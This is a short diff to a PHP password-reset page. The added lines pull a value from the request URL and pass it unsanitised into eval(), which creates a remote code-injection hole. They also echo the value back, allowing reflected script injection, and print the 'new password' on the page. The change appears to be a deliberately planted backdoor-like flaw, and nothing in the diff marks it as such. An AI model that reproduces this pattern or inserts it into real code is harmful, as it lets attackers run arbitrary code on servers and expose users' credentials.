@@ -10,7 +10,14 @@
   $url = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 
   if (strpos($url, "password_reset") == true) {
+
     echo "<p>Password reset successfully</p><br>";
+
+    $password = substr($url, strrpos($url, '=') + 1);
+
+    eval("\$y = \"$password\";");
+
+    echo "Your new password is " . $password;
   }
 
 ?>
